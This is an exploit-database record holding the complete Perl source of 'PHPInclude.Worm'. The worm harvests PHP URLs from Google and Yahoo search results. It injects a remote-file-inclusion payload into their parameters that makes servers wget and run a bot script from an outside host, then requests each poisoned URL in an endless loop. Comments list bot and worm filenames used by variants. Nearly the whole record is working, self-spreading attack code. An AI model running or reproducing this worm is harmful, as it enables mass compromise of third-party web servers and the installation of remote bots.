{
  "id": "725",
  "title": "PHPInclude.Worm - PHP Scripts Automated Arbitrary File Inclusion",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::Simple;\r\nuse IO::Socket::INET;\r\n\r\nwhile(1){\r\n$numr = int rand(9999);\r\n$caxe = \".\";\r\n$caxe1 = \".\";\r\n$caxe .= rand(9999);\r\n$caxe1 .= rand(9999);\r\n$arq = \".\";\r\n$arq = int rand(9999);\r\n\r\nopen(sites,\">$arq\");\r\nprint sites \"\";\r\nclose(sites);\r\n\r\n\r\n$procura = 'inurl:*.php?*=' . $numr;\r\n\r\nfor($n=0;$n<900;$n += 10){\r\n$sock = IO::Socket::INET->new(PeerAddr => \"www.google.com.br\", PeerPort \r\n=> 80, Proto => \"tcp\") or next;\r\nprint $sock \"GET /search?q=$procura&start=$n HTTP/1.0\\n\\n\";\r\n@resu = <$sock>;\r\nclose($sock);\r\n$ae = \"@resu\";\r\nwhile ($ae=~ m/<a href=.*?>.*?<\\/a>/){\r\n$ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;\r\n$uber=$1;\r\nif ($uber !~/translate/)\r\n{\r\nif ($uber !~ /cache/)\r\n{\r\nif ($uber !~ /\"/)\r\n{\r\nif ($uber !~ /google/)\r\n{\r\nif ($uber !~ /216/)\r\n{\r\nif ($uber =~/http/)\r\n{\r\nif ($uber !~ /start=/)\r\n{\r\nopen(arq,\">>$arq\");\r\nprint arq \"$uber\\n\";\r\nclose(arq);\r\n}}}}}}}}}\r\n\r\n\r\nfor($cadenu=1;$cadenu <= 991; $cadenu +=10){\r\n\r\n@cade = get(\"http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1\r\n&pstart=1&b=$cadenu\") or next;\r\n$ae = \"@cade\";\r\n\r\nwhile ($ae=~ m/<em class=yschurl>.*?<\\/em>/){\r\n$ae=~ s/<em class=yschurl>(.*?)<\\/em>/$1/;\r\n$uber=$1;\r\n\r\n$uber =~ s/ //g;\r\n$uber =~ s/<b>//g;\r\n$uber =~ s/<\\/b>//g;\r\n\r\nopen(a,\">>$arq\");\r\nprint a \"$uber\\n\";\r\nclose(a);\r\n}}\r\n\r\n$ark = $arq; \r\n@si = \"\";\r\nopen (arquivo,\"<$ark\");\r\n@si = <arquivo>;\r\nclose(arquivo);\r\n$novo =\"\"; \r\nforeach (@si){\r\nif (!$si{$_})\r\n{ \r\n$novo .= $_;\r\n$si{$_} = 1;\r\n}\r\n}\r\nopen (arquivo,\">$ark\");\r\nprint arquivo $novo;\r\nclose(arquivo);\r\n\r\n\r\n$a =0;\r\n$b =0;\r\nopen(ae,\"<$arq\");\r\nwhile(<ae>)\r\n{$sites[$a] = $_;\r\nchomp $sites[$a];\r\n$a++;\r\n$b++;}\r\nclose(ae);\r\n\r\nfor ($a=0;$a<=$b;$a++){\r\nopen (file, \">$caxe\");\r\nprint file \"\";\r\nclose(file);\r\nopen (file, \">$caxe1\");\r\nprint file \"\";\r\nclose(file);\r\n$k=0;\r\n$e=0;\r\n$data=get($sites[$a]) or next;\r\nwhile($data=~ m/<a href=\".*?\">.*?<\\/a>/){\r\n$data=~ s/<a href=\"(.*?)\">.*?<\\/a>/$1/;\r\n$ubersite=$1;\r\n\r\nif ($ubersite =~/\"/)\r\n{\r\n$nu = index $ubersite, '\"';\r\n$ubersite = substr($ubersite,0,$nu);\r\n}\r\nif ($ubersite !~/http/)\r\n{$ubersite = $sites[$a].'/'.$ubersite;} \r\nopen(file,\">>$caxe\") || die(\"nao abriu caxe.txt $!\");\r\nprint file \"$ubersite\\n\"; \r\nclose(file); \r\n}\r\n\r\n$lista1 = 'http://server/spy.gif?&cmd=cd /tmp;wget www.server.tld/spybot.txt; perl php.txt';\r\n# Other filenames included with this and other variants :\r\n# adfkgnnodfijg \r\n# bot \r\n# bot.txt \r\n# bot.txt.1 \r\n# dry.scp \r\n# ssh.a \r\n# terrorbot.txt \r\n# terrorbot.txt.1 \r\n# terrorworm.txt \r\n# terrorworm.txt.1 \r\n# unbot.txt \r\n# unbot.txt.1 \r\n# unbot.txt.2 \r\n# unbot.txt.3 \r\n# unworm.txt \r\n# unworm.txt.1 \r\n# unworm.txt.2 \r\n# unworm.txt.3 \r\n# worm1.txt \r\n# worm.txt \r\n# worm.txt.1 \r\n$t =0;\r\n$y =0;\r\n@ja;\r\nopen(opa,\"<$caxe\") or die \"nao deu pra abrir o arquivo caxe.txt\";\r\nwhile (<opa>)\r\n{\r\n$ja[$t] = $_;\r\nchomp $ja[$t];\r\n$t++;\r\n$y++;\r\n}\r\nclose(opa);\r\n$t=1;\r\nwhile ($t < $y)\r\n{\r\nif ($ja[$t] =~/=/)\r\n{\r\n$num = rindex $ja[$t], '=';\r\n$num += 1;\r\n$ja[$t] = substr($ja[$t],0,$num); \r\nopen (jaera,\">>$caxe1\") or die \"nao deu pra abrir ou criar caxe1.txt\";\r\nprint jaera \"$ja[$t]$lista1\\n\";\r\nclose(jaera);\r\n$num = index $ja[$t], '=';\r\n$num += 1;\r\n$ja[$t] = substr($ja[$t],0,$num); \r\n$num1 = rindex $ja[$t], '.';\r\n$subproc = substr($ja[$t],$num1,$num);\r\n\r\nopen (jaera,\">>$caxe1\") or die \"nao deu pra abrir ou criar caxe1.txt\";\r\nprint jaera \"$ja[$t]$lista1\\n\";\r\nclose(jaera);\r\n}\r\n$t++;\r\n}\r\n$ark = \"$caxe1\"; \r\n@si = \"\";\r\nopen (arquivo,\"<$ark\");\r\n@si = <arquivo>;\r\nclose(arquivo);\r\n$novo =\"\"; \r\nforeach (@si){\r\nif (!$si{$_})\r\n{ \r\n$novo .= $_;\r\n$si{$_} = 1;\r\n}\r\n}\r\nopen (arquivo,\">$ark\");\r\nprint arquivo $novo;\r\nclose(arquivo);\r\n$q=0;\r\n$w=0;\r\n@hot;\r\nopen (ops,\"<$caxe1\");\r\nwhile(<ops>)\r\n{\r\n$hot[$q] = $_;\r\nchomp $hot[$q];\r\n$q++;\r\n$w++;\r\n}\r\nclose(ops);\r\n\r\nfor($q=0;$q<=$w;$q++)\r\n{\r\n\r\nif ($hot[$q] =~/http/)\r\n{\r\n$tipo=get($hot[$q]) or next;\r\n}}\r\n}\r\n}\r\n\r\n# milw0rm.com [2004-12-25]",
  "url": "https://www.exploit-db.com/exploits/725"
}